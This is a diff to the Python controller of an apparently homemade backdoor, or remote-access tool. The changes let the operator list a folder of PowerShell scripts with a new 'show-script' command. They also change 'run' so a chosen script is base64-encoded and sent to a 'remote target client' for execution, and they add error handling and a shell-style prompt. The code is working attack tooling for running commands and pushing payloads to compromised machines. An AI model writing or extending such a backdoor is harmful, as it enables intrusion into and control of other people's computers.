@@ -34,9 +34,14 @@ def write_file( path, content):
 
 # Read file For Upload To Backdoor
 def read_file(path):
-    path = os.path.normpath(path)
-    with open(path, "rb") as file:
-        return base64.b64encode(file.read())
+    try:
+        
+        path = os.path.normpath(path)
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+    except Exception as ex:
+        print(colored("Error from read_file", "red"))
+        print(ex)     
     
     
 # Send Data
@@ -55,7 +60,24 @@ def reliable_receive(s):
             # print(colored("Error form reliable_receive ", "red"))
             # print(e)
             continue
+        
+def create_file_script():
+    folder_path = "powerShell"
+    files_powerShell_script = {}
+    for root, dirs, files in os.walk(folder_path):
+        for file_name in files:
+            file_path = os.path.join(root, file_name)
+            files_powerShell_script[file_name] = file_path
+    return files_powerShell_script
 
+def showScript():
+    files_powerShell_script = create_file_script()
+    table = PrettyTable()
+    table.field_names = ["File Name", "File Path"]
+
+    for file_name, file_path in files_powerShell_script.items():
+        table.add_row([file_name, file_path])
+    return table
 
 
 # ------------------------------------------------------------------------------
@@ -182,7 +204,7 @@ def factory_input(input_string):
 
 # connect with remote target client
 def send_target_commands(conn):
-    location = ""
+    location = "Bash$ "
     while True:
         try:
         
@@ -205,11 +227,21 @@ def send_target_commands(conn):
                 command.append(file_content.decode())
                 
             if command_user == "run":
-                file_content = read_file(command[1])
+                files_script_dict = create_file_script()
+                path_file = files_script_dict[command[1]]
+                
+                file_content = read_file(path_file)
                 command.append(file_content.decode())
-            
-            
+                
+            if command_user == "show-script":
+                print(showScript())
+                cprint(location, "red", attrs=["bold"], end="")
+                continue
+                
+            # ----------------------------------------------------------
             result_from_client = execute_command(conn=conn, data=command)
+            # ----------------------------------------------------------
+            
             if command_user == "whoami":
                 print(result_from_client)
                 cprint(location, "red", attrs=["bold"], end="")
